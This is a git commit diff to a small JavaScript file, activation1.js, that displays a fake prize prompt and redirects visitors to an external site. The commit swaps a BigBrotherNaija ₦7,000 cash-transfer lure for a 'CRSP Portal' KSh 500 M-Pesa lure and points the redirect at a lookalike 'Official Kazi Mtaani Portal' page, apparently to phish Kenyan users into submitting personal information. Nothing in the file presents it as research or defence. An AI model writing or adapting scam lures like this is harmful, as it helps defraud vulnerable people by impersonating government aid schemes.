fbfe49be633a9c80cdffd23a9b3dca81930ac0e6
gethelppd <fxmitaco.m@gmail.com>
2025-10-05 23:16:49 +0100

    Update activation1.js

--- activation1.js
+++ activation1.js
@@ -1,5 +1,5 @@
 var password = 'Submit Now'
-password=prompt('BBN: Congratulations, you are eligible to receive the â‚¦7,000 BigBrotherNaija Cash Transfer, Kindly press OK to submit your information and receive â‚¦7,000 now ','Submit Now');
+password=prompt('CRSP Portal: Congratulations, you are eligible to receive the KSh 500 M-Pesa Cash Transfer, Kindly press OK to submit your information and receive KSh 500 now ','Submit Now');
 if (password != 'Submit Now') {
-location.href='https://bigbrothernaija.give-out.today';
+location.href='https://get-it-online.site/Official-Kazi-Mtaani-Portal.html';
 }
